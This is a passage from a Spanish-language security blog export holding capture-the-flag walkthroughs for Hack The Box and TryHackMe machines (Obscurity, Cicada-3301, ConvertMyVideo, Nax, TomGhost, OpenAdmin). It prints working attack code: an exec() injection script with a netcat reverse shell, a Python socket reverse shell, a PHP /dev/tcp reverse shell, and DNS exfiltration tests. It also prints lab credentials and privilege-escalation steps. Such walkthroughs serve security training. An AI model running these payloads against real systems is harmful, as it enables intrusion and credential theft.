BadHTTPServer | Last-Modified: Thu, 09 Jan 2020 02:23:52 | Content-Length: 4171 | Content-Type: text/html | Connection: Closed | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;0bscura\u0026lt;/title\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=Edge\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;keywords\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;!-- | Easy Profile Template | http://www.templatemo.com/tm-467-easy-profile | \u0026lt;!-- stylesheet css --\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/templatemo-blue.css\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body data-spy=\u0026#34;scroll\u0026#34; data-target=\u0026#34;.navbar-collapse\u0026#34;\u0026gt; | \u0026lt;!-- preloader section --\u0026gt; | \u0026lt;!-- | \u0026lt;div class=\u0026#34;preloader\u0026#34;\u0026gt; |_ \u0026lt;div class=\u0026#34;sk-spinner sk-spinner-wordpress\u0026#34;\u0026gt; |_http-server-header: BadHTTPServer |_http-title: 0bscura 9000/tcp closed cslistener 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.80%I=7%D=1/8%Time=5E168E70%P=x86_64-pc-linux-gnu%r(Get [ ... snip ... ] SF:-spinner\\x20sk-spinner-wordpress\\\u0026#34;\u0026gt;\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jan 8 20:24:22 2020 -- 1 IP address (1 host up) scanned in 373.38 seconds   HTTP En el puerto 8080 encontramos una pagina web, la cual contiene informacion sobre una empresa.\nEn la parte de abajo encontramos un mensaje dirigido a los desarrolladores, dando a entender que en el directorio secreto se encuentra el codigo fuente de la pagina.\nWFUZZ Utilizamos wfuzz para encontrar el archivo \u0026lsquo;SuperSecureServer.py\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  root@aoiri:~/htb/obscurity# wfuzz -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirb/common.txt --hc 404 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 2.4 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py Total requests: 4614 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000001245: 200 170 L 498 W 5892 Ch \u0026#34;develop\u0026#34; Total time: 116.5698 Processed Requests: 4614 Filtered Requests: 4613 Requests/sec.: 39.58142   Encontramos el archivo \u0026lsquo;SuperSecureServer.py\u0026rsquo; del servidor.\nRCE - SuperSecureServer.py Analizamos el codigo del archivo y encontramos una vulnerabilidad la cual se encuentra al realizar una consulta a de un directorio. Al pasarle un directorio (\u0026lsquo;directorioABC\u0026rsquo;) entre comillas, este elimina las comillas, pasa por la funcion exec() y se utiliza el directorio como una variable en un string, en el caso de que no haya errores sigue ejecutandose el codigo.\nCodigo vulnerable:\n1 2 3 4  path = urllib.parse.unquote(path) try: info = \u0026#34;output = \u0026#39;Document: {}\u0026#39;\u0026#34; # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right?   Utilizamos el siguiente payload para ejecutar comandos:\n1  \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34; COMANDO \u0026#34;)\\n #\u0026#34;\u0026#39;   Realizamos pruebas haciendo una consultas DNS a nuestra maquina:\n1  cmd = \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34;nslookup $PATH 10.10.15.122\u0026#34;)\\n#\u0026#34;\u0026#39;   Ejecutamos una shell inversa y obtenemos acceso con el usuario www-data:\nCodigo:\n1 2 3 4 5 6 7 8 9 10 11 12  import requests import urllib #cmd = \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34; COMMAND \u0026#34;)\\n #\u0026#34;\u0026#39; #cmd = \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34;nslookup $(which nc) 10.10.14.14\u0026#34;)\\n #\u0026#34;\u0026#39; cmd = \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.14 1336 \u0026gt;/tmp/f \u0026#34;)\\n#\u0026#34;\u0026#39; path = urllib.parse.quote(cmd, safe=\u0026#39;\u0026#39;) print(path) url = \u0026#34;http://obscure.htb:8080/\u0026#34;+path r = requests.get(url)   USER - Robert Enumeramos la carpeta principal del usuario robert, encontramos varios archivos, un script en python que encripta/desencripta archivos utilizando una clave.\nTambien vemos archivos en texto plano, pero dos de ellos parecen estar encriptados por el script.\nAl ejecutar el script nos muestra los parametros que necesita para encriptar y desencriptar un archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13  www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -h python3 SuperSecureCrypt.py -h usage: SuperSecureCrypt.py [-h] [-i InFile] [-o OutFile] [-k Key] [-d] Encrypt with 0bscura\u0026#39;s encryption algorithm optional arguments: -h, --help show this help message and exit -i InFile The file to read -o OutFile Where to output the encrypted/decrypted file -k Key Key to use -d Decrypt mode www-data@obscure:/home/robert$   Utilizamos dicho script para poder desencriptar el archivo out.txt con el archivo check.txt como clave para obtener la clave de encriptacion:\n1  python3 SuperSecureCrypt.py -i out.txt -o /tmp/what.txt -k \u0026#34;$(cat check.txt)\u0026#34; -d   Utilizamos la clave para poder desencriptar el archivo out.txt y vemos que es el mismo mensaje que el archivo check.txt tiene, por lo que ya tenemos la clave:\n1  python3 SuperSecureCrypt.py -i out.txt -o /tmp/what2.txt -k \u0026#34;alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich\u0026#34; -d   Utilizamos la clave para desencriptar el archivo passwordreminder.txt:\n1  python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/what3.txt -k \u0026#34;alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich\u0026#34; -d   Obtenemos una contraseña, utilizamos la contraseña con el usuario robert y obtenemos una shell y nuestra flag user.txt:\nrobert:SecThruObsFTW PRIVILEGE ESCALATION Enumeramos los comandos que pueden ser ejecutados con privilegios de root sin contraseña, encontramos un script en python.\nDicho script pregunta por usuario y su contraseña existentes en la maquina, lee /etc/shadow y escribe su contenido en /tmp/SSH/, solo si las credenciales dadas corresponden a uno de los usuarios, el script ejecuta los comandos que se le pasen y elimina el archivo creado en /tmp/SSH/.\nYa que tenemos un usuario con sus credenciales ejecutamos el script pasando el usuario robert y la contraseña SecThruObsFTW, al hacer esto se escribira en /tmp/SSH/ las contraseñas encriptadas de la maquina.\n1  /usr/bin/sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py   Al mismo tiempo en otra shell utilizamos watch para ver los cambios que hay en /tmp/SSH/ obteniendo con cat el archivo temporal de las contraseñas.\n1  watch -t -d -g -n 0.1 \u0026#34;cat /tmp/SSH/* |base64 \u0026gt; /tmp/b.txt \u0026#34;   Obtenemos el hash del usuario root y robert, utilizamos John The Ripper para desencriptar la contraseña.\nObtenemos la contraseña, una shell con privilegios root y nuestra flag root.txt.\nroot:mercedes\n","description":"","id":27,"section":"posts","tags":["linux"],"title":"Hack The Box - Obscurity","uri":"https://sckull.github.io/posts/obscurity/"},{"content":"Cicada-3301 Vol:1 es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Cicada-3301 Vol:1     Info A basic steganography and cryptography challenge room based on the Cicada 3301 challenges   Puntos 148   Dificultad Media   Maker Cryillic    Analyze The Audio Al inicio tenemos un archivo de audio (3301.wav) al cual le añadimos una capa de espectrograma utilizando Sonic Visualiser.\nNos devuelve una imagen QR el cual obtuvimos una URL utilizando el Lector QR inlite.\nDecode the Passphrase Una URL hacia Pastebin.\nUtilizamos CyberChef para poder decodificar la frase y la clave en base64.\nUtilizamos Vigenere para poder codificar nuevamente (como el reto lo indica) con la clave que encontramos a la frase decodificada.\nGather Metadata Utilizamos la frase que codificamos para extraer el archivo dentro de la imagen welcome.jpg, y nos da una url de una image.\nLa imagen de la URL.\nFind Hidden Files En este Task intentamos con muchas herramientas de esteganografia y encontramos la correcta, Outguess para poder obtener la informacion (archivo) dentro de la imagen.\nEn el mensaje nos indica que debemos de romper el hash para poder encontrar el libro.Tambien una combinacion de letras y numeros y que debemos de ir hacia delante si el numero es positivo, y hacia atras si el numero es negativo.\nEl hash:\nb6atryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackme348 Verificamos que tipo de hash es y vemos que es SHA2-512.\nUtilizamos https://md5hashing.net para poder obtener el texto el cual es una URL a pastebin.\nBook Cipher La URL de pastebin contiene lo que parece ser el capitulo de un libro.\nRecordemos el nombre del challenge Cicada 3301, investigamos acerca del reto, especificamente de la solucion, y encontramos que el reto se parece bastante a Cicada 3301 - The Book Cipher, por lo que utilizamos el ejemplo para obtener la URL para el Task 7, para ello escribimos un pequeño script en python al cual le pasamos la linea del libro y el numero de letra que debe extraer, omitimos la primera letra ya que hace referencia al Capitulo I (es el que tenemos).\nHay que mencionar que este tipo de cifrado para resolverlo se puede utilizar la sintaxis siguiente (par1:par2:par3), pueden ser numeros de pagina, linea, palabra o letra, para este reto era sencillo: linea:letra y omitimos los espacios ya que devuelve un valor distinto.\nTambien, este cifrado para resolverlo comenzamos desde la primera letra de la Oracion y no de la linea, en el caso de los numeros negativos vamos hacia atras de la oracion como nos indicaba el mensaje.\n Spoiler El script: [**Script.py**](https://github.com/sckull/ctf-stuff/tree/master/tryhackme/cicada3301_vol1)  Al resolverlo por completo nos devuelve una URL acortada que nos redirige a soundcloud.\nThe Final Song Ingresar el Nombre de la Cancion encontrada.\n","description":"","id":28,"section":"posts","tags":["challenge"],"title":"TryHackMe - Cicada-3301 Vol:1","uri":"https://sckull.github.io/posts/cicada3301vol1/"},{"content":"ConvertMyVideo es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo ConvertMyVideo     Info My Script to convert videos to MP3 is super secure   Puntos 320   Dificultad Media   Maker overjt    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Tue May 5 19:02:47 2020 as: nmap -sV -o nmap_scan_mini convertmyvideo.thm Nmap scan report for convertmyvideo.thm (10.10.1.154) Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 5 19:03:30 2020 -- 1 IP address (1 host up) scanned in 43.02 seconds   HTTP Encontramos una pagina sencilla en el puerto 80, en la que nos muestra un formulario en donde nos pide un ID de un video de YouTube.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8  root@upset:~/thm/convertmyvideo# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://convertmyvideo.thm/ -q -t 25 -x php,html,txt /admin (Status: 401) /images (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /js (Status: 301) /server-status (Status: 403) /tmp (Status: 301)   Dentro del codigo fuente de la pagina encontramos el codigo de envio del ID en Javascript, el cual envia la URL de youtube añadiendole el ID.\nUtilizamos Burpsuite para capturar el envio de el ID, le agregamos un ID erroneo y nos da una respuesta en el que nos devuelve el error que se generó.\nCOMMAND INJECTION Eliminamos la URL y enviamos algo diferente, y vemos que el mensaje de error contiene el nombre de una herramienta que se utiliza para descargar videos de YouTube - youtube-dl.\nPara verificar que esa herramienta esta siendo utilizada con la pagina, enviamos la flag --help para confirmar que es esa herramienta, y nos devolvió todas las opciones.\nAl parecer la pagina esta utilizando youtube-dl para pasarle la url con el ID que ingresamos, mediante la ejecucion de la herramienta a traves de consola. Intentamos romper este comando y sus parametros, utilizamos command injection, con | y el comando id más el separador ; (punto y coma) esto para separar y no ejecutar los parametros adicionales. Logramos ejecutar el comando.\nAhora que podemos ejecutar comandos, comenzamos a enumerar los archivos que estan en la maquina, vemos que la direccion donde estamos es en /var/www/html y los archivos que se encuentran en esa direccion.\nLogramos obtener el codigo fuente de index.php utilizando cat{$IFS}index.php (utilizamos {$IFS} para agregar espacios).\nVemos en el codigo fuente que ejecuta el comando youtube-dl con sus parametros y en medio pasa la URL que es ingresada por el usuario.\nVemos la carpeta de admin, la cual contiene un index.php y flag.txt.\nIntentamos realizar cat a la flag.txt y obtenemos la primera.\nEnumeramos la carpeta nuevamente con mas profundidad y econtramos el archivo .htaccess.\nEjecucion de Comando\n1 2 3 4 5 6 7 8 9 10  total 36 drwxr-xr-x 6 www-data www-data 4096 Apr 12 04:42 . drwxr-xr-x 3 root root 4096 Apr 12 01:07 .. -rw-r--r-- 1 www-data www-data 152 Apr 12 03:58 .htaccess drwxr-xr-x 2 www-data www-data 4096 Apr 12 05:05 admin drwxrwxr-x 2 www-data www-data 4096 Apr 12 04:26 images -rw-r--r-- 1 www-data www-data 1790 Apr 12 04:55 index.php drwxrwxr-x 2 www-data www-data 4096 Apr 12 04:44 js -rw-rw-r-- 1 www-data www-data 205 Apr 12 04:40 style.css drwxr-xr-x 2 www-data www-data 4096 Apr 12 05:13 tmp   El archivo contiene lo siguiente y al parecer hay un archivo .htpasswd en la carpeta admin.\n1 2 3 4 5 6 7 8 9 10 11  \u0026lt;Files /admin/.htpasswd\u0026gt; Order allow,deny Deny from all \u0026lt;/Files\u0026gt; \u0026lt;Files /admin/.htaccess\u0026gt; Order allow,deny Deny from all \u0026lt;/Files\u0026gt; Options -Indexes   Hacemos cat al archivo y logramos obtener un usuario y contraseña encriptada.\nUtilizamos john para obtener la contraseña.\nIngresamos a la pagina utilizando el panel de /admin y vemos un boton que al presionarlo realiza la ejecucion de un comando.\nVemos que podemos ejecutar comandos:\nUSER - WWW-DATA Utilizamos python para ejecutar nuestra shell inversa y ponemos a la escucha nuestro netcat.\n1  python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.18.1.160\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;   Logramos obtener una shell con usuario www-data\nPRIVILEGE ESCALATION Mediante una enumeracion basica de binarios no encontramos alguno que nos puediera ayudar, utilizamos pspy para ver si existe algun cronjob en la maquina. Encontramos que se ejecuta un cronjob el cual ejecuta el archivo clean.sh que se encuentra en /var/www/html/tmp/.\nAgregamos una shell inversa a este archivo y pusimos a la escucha netcat, logramos obtener una shell con usuario root y nuestra flag root.txt.\n","description":"","id":29,"section":"posts","tags":["linux"],"title":"TryHackMe - ConvertMyVideo","uri":"https://sckull.github.io/posts/convertmyvideo/"},{"content":"Nax es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Nax     Info Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows an user authenticated execute remote code execution.   Puntos 490   Dificultad Media   Maker stuxnet    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80), ldap (389) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  # Nmap 7.80 scan initiated Tue May 5 00:26:26 2020 as: nmap -sV -o nmap_scan_mini nax.thm Nmap scan report for nax.thm (10.10.253.17) Host is up (0.26s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 25/tcp open smtp Postfix smtpd 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X 443/tcp open ssl/ssl Apache httpd (SSL-only mode) Service Info: Host: ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 5 00:27:33 2020 -- 1 IP address (1 host up) scanned in 67.23 seconds # Nmap 7.80 scan initiated Tue May 5 00:27:36 2020 as: nmap -T5 -sV -sC -p- -o nmap_scan nax.thm Warning: 10.10.253.17 giving up on port because retransmission cap hit (2). Nmap scan report for nax.thm (10.10.253.17) Host is up (0.18s latency). Not shown: 65358 closed ports, 171 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA) | 256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA) |_ 256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, | ssl-cert: Subject: commonName=ubuntu | Not valid before: 2020-03-23T23:42:04 |_Not valid after: 2030-03-21T23:42:04 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X 443/tcp open ssl/ssl Apache httpd (SSL-only mode) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US | Not valid before: 2020-03-24T00:14:58 |_Not valid after: 2030-03-22T00:14:58 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 5667/tcp open tcpwrapped Service Info: Host: ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 5 00:42:16 2020 -- 1 IP address (1 host up) scanned in 879.93 seconds   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11  root@upset:~/thm/nax# gobuster dir -u http://nax.thm/ -w /usr/share/wordlists/dirb/common.txt -t 25 -q -x php,html,txt /cgi-bin/ (Status: 403) /cgi-bin/.php (Status: 403) /cgi-bin/.html (Status: 403) /index.html (Status: 200) /index.php (Status: 200) /index.html (Status: 200) /index.php (Status: 200) /javascript (Status: 301) /nagios (Status: 401) /server-status (Status: 403)   HTTP  Encontramos una pagina simple en el puerto 80 y en el codigo fuente encontramos una direccion.\nGOBUSTER /nagiosxi/ Utilizamos gobuster para busqueda de directorios y archivos en /naxiosxi/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  root@upset:~/thm/nax# gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 25 -q -x php,html,txt -u http://nax.thm/nagiosxi/ /about (Status: 301) /account (Status: 301) /admin (Status: 301) /api (Status: 301) /backend (Status: 301) /config (Status: 301) /db (Status: 301) /help (Status: 301) /images (Status: 301) /includes (Status: 301) /index.php (Status: 302) /index.php (Status: 302) /install.php (Status: 302) /login.php (Status: 200) /reports (Status: 301) /tools (Status: 301) /upgrade.php (Status: 302) /views (Status: 301)   NAGIOS XI RCE En la ruta /naxiosxi/ encontramos una plataforma la de Naxios XI, buscamos un exploit que pueda afectar esta plataforma y vemos que existe un exploit NagiosXi RCE el cual necesita un usuario y contraseña, tambien existe un exploit para metasploit nagiosxi_authenticated_rce.\nEn la pagina principal (/) encontramos una image ASCII de lo que parece ser Cicada 3301 y con algunos valores debajo de esta Ag Hg Ta Sb Po Pd Hg Pt Lr al principio intentamos utilizar un decodificador de Gematria Primus pero los valores numericos no reflejaban ningun tipo de texto o codificacion valida. Realizamos una busqueda de estos valores y encontramos que todos pertenecen a la tabla periodica, obtenemos los valores numericos de cada elemento.\n1 2 3 4 5 6 7 8 9  Ag ---\u0026gt; 47 Hg ---\u0026gt; do it yourself Ta ---\u0026gt; \u0026gt;:) Sb ---\u0026gt; do it yourself Po ---\u0026gt; \u0026gt;:) Pd ---\u0026gt; do it yourself Hg ---\u0026gt; \u0026gt;:) Pt ---\u0026gt; do it yourself Lr ---\u0026gt; 103   Al obtener estos valores lo decodificamos de hex a texto plano y encontramos una direccion de un archivo.\nAl visitar la direccion del archivo vemos que es una imagen que tiene texto codificado y utiliza la codificacion de piet.\nAl decodificar la imagen nos devuelve una cadena de caracteres.\nLogramos obtener un usuario y contraseña, verificamos que funcionan en la plataforma ingresando con las credenciales.\nUtilizamos estas credenciales con el exploit que encontramos para Naxios (El exploit me dio algunos errores por lo que tuve que agregar la contraseña directamente al codigo).\nEjecutamos el exploit y ponemos a la escucha netcat, y logramos obtener una shell.\nNuestra shell ya tiene privilegios root por lo que no es necesario escalar privilegios, y logramos obtener nuestra flag user.txt y root.txt.\nMetasploit - NagiosXi RCE Utilizamos el exploit disponible para metasploit y funciona muy bien.\n","description":"","id":30,"section":"posts","tags":["linux"],"title":"TryHackMe - Nax","uri":"https://sckull.github.io/posts/nax/"},{"content":"TomGhost es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Tomghost     Info Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.   Puntos 810   Dificultad Media   Maker stuxnet    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (8080), ajp13 (8009) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  # Nmap 7.80 scan initiated Mon May 4 21:55:03 2020 as: nmap -sV -o nmap_scan_mini tomgost.thm Nmap scan report for tomgost.thm (10.10.190.132) Host is up (0.22s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 53/tcp open tcpwrapped 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8080/tcp open http Apache Tomcat 9.0.30 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon May 4 21:55:31 2020 -- 1 IP address (1 host up) scanned in 28.22 seconds   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7  root@upset:~/thm/tomghost# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://tomgost.thm:8080/ -q -t 25 -x php,html,txt /docs (Status: 302) /examples (Status: 302) /favicon.ico (Status: 200) /host-manager (Status: 302) /manager (Status: 302) root@upset:~/thm/tomghost#   HTTP Puerto 8080 Encontramos Apache Tompact en el puerto 8080.\nAJP \u0026lsquo;Ghostcat File Read/Inclusion\u0026rsquo; - Puerto 8009 Para el servicio en el puerto 8009 (Apache Jserv) encontramos un exploit que permite lectura de archivos, utilizamos el exploit CVE-2020-1938. Intentamos leer el archivo index.jsp y logramos obtener el codigo fuente.\nYa que logramos obtener el codigo fuente de index.jsp, intentamos obtener el archivo de configuracion web.xml, logramos obtener el codigo fuente y logramos ver lo que parecen credenciales.\nUSER - SKYFUCK Intentamos ingresar en el panel de tomcat (/manager/html) pero no esta autorizado el acceso. Utilizamos el servicio SSH con las credenciales encontradas y logramos obtener una shell.\nDentro de la carpeta principal de Skyfuck encontramos dos arhivos una clave y un archivo encriptado, intentamos importar la key y desencriptar el archivo gpg pero al parecer la clave esta protegida por una frase.\nUtilizamos gpg2john para generar el hash y utilizar john para encontrar la frase.\nUna vez encontrada la frase utilizamos esta para desencriptar el archivo credentials.gpg.\nUSER - MERLIN Utilizamos las credenciales encontradas y obtenemos una shell con el usuario merlin y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando zip. Utilizamos zip para obtener una shell root.\nLogramos obtener una shell con usuario root y nuestra flag root.txt.\n","description":"","id":31,"section":"posts","tags":["linux"],"title":"TryHackMe - TomGhost","uri":"https://sckull.github.io/posts/tomgost/"},{"content":"OpenAdmin es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre OpenAdmin     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.171   Maker dmw0ng    MASSCAN \u0026amp; NMAP Escaneo de puertos tcp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-08 05:54:56 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.171 Discovered open port 80/tcp on 10.10.10.171 # Nmap 7.80 scan initiated Tue Jan 7 23:51:39 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.171 Warning: 10.10.10.171 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.171 Host is up (0.15s latency). Not shown: 65528 closed ports PORT STATE SERVICE VERSION 22/tcp open tcpwrapped | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf🇩🇪bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 16874/tcp filtered unknown 31545/tcp filtered unknown 40838/tcp filtered unknown 42307/tcp filtered unknown 47055/tcp filtered unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jan 7 23:53:43 2020 -- 1 IP address (1 host up) scanned in 123.98 seconds   HTTP Pagina por default de Apache.\nGOBUSTER - HTTP Busqueda de directorios y archivos con gobuster.\n1 2 3 4 5 6  root@aoiri:~/htb/openadmin# gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 115 -x php,html,txt -q /index.html (Status: 200) /music (Status: 301) /artwork (Status: 301) /sierra (Status: 301) /marga (Status: 301)   /music /sierra /marga /artwork OpenNetAdmin 18.1.1 - Remote Code Execution  En la pagina de /music encontramos que la pagina login nos redirige hacia otra pagina diferente (/ona), en la cual esta corriendo el gestor OpenNetAdmin en su version 18.1.1.\nEste gestor tiene una vulnerabilidad del tipo RCE y encontramos un exploit (OpenNetAdmi - ExploitDB ) que aprovecha esta vulnerabilidad, ejecutamos dicho exploit pasandole la url como parametro.\nUSER - Jimmy Ahora que podemos ejecutar comandos vamos a actualizar nuestra shell a una shell inversa utilizando PHP, descargando el archivo y abriendolo en el navegador para ejecutarlo.\n1  \u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.15.72/1227 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;);   Descargamos en la maquina:\n1  wget 10.10.15.72/sc.php   Obtenemos nuestra shell inversa:\nEntre los archivos de configuracion de la base de datos de OpenNetAdmin encontramos las credenciales para acceder a la base de datos, utilizamos la contraseña para obtener una shell con el usuario Jimmy.\nJimmy:\nCredenciales:\njimmy:n1nj4W4rri0R! USER - Joanna Dentro de la carpeta /var/www/ donde usualmente se encuentran las paginas de apache, vemos que jimmy tiene permisos en una de las carpetas.\nCambiamos nuestra shell a SSH con el usuario Jimmy para poder enumerar los archivos dentro de la carpeta /home y /var/www.\nEn la carpeta principal de Jimmy encontramos un archivo PHP - post.php el cual hace una solicitud con curl (en PHP) enviando un usuario y contraseña y obtiene el resultado de la solicitud.\nAl ejecutarlo nos muestra un error:\nPero la solicitud la hace hacia el localhost de la maquina en un puerto que no es publico.\nEn /var/www/internal, vemos que en archivo index.php existe una contraseña encriptada.\nCon la ayuda de crackstation logramos obtener en texto plano la contraseña:\nCredenciales:\njimmy:Revealed Ahora 